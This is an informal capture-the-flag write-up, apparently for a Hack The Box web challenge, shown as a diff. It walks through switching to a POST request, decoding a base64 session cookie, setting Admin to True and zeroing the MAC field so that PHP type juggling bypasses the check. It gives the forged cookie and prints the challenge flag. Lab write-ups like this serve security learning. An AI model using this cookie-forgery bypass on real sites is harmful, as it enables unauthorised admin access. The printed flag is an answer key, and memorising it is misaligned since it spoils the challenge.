@@ -1,0 +1,63 @@
+When we access this page we get a Forbidden error. However we believe that something strange lies behind... Can you find a way in and retrieve the flag?
+
+
+
+Change the Method type ,User agent some thing is behind the web....
+
+change Method ::  POST /index.php HTTP/1.1
+
+got some output or bypass
+
+'''
+<form action="index.php" method="post">
+Change Username: <br>
+<input type="text" name="fuckhtml" placeholder="notimportant">
+<!-- HTB hint:really not important...totaly solvable without using it! Just there to fill things and to save you from some trouble you might get into :) -->
+<input type="submit" value="Change">
+'''
+
+
+
+
+'''
+POST /index.php HTTP/1.1
+Host: docker.hackthebox.eu:32017
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+Connection: close
+Cookie: ses=eyJVc2VyIjoid2hvY2FyZXMiLCJBZG1pbiI6IkZhbHNlIiwiTUFDIjoiZmY2ZDBhNTY4ZDYxZTVhMDNiY2RiMDQ1MDlkNTg4NWQifQ%3D%3D
+Upgrade-Insecure-Requests: 1
+'''
+
+response is said that you are not admin so we need admin
+
+decode cookie in base64 :: {"User":"whocares","Admin":"False","MAC":"ff6d0a568d61e5a03bcdb04509d5885d"
+
+{"User":"whocares","Admin":"True","MAC":"ff6d0a568d61e5a03bcdb04509d5885d"}
+
+
+
+what are you trying to do huh? 
+
+worked but some protection is also there 
+
+
+
+{"User":"whocares","Admin":"True","MAC":0}
+
+eyJVc2VyIjoid2hvY2FyZXMiLCJBZG1pbiI6IlRydWUiLCJNQUMiOjB9
+
+
+<h1> well done! flag is: TypejugAlingSOulS </h1><br>I suck at php so if you finished the challenge with a method other than type juggling the MAC field or found a bug,please let me know :D <br>-forGP <br><br> oh...<a href="http://imgur.com/m1OOHuE">and look how kind I am :P </a>
+
+
+
+						HTB{TypejugAlingSOulS}
+
+
+
+			
+
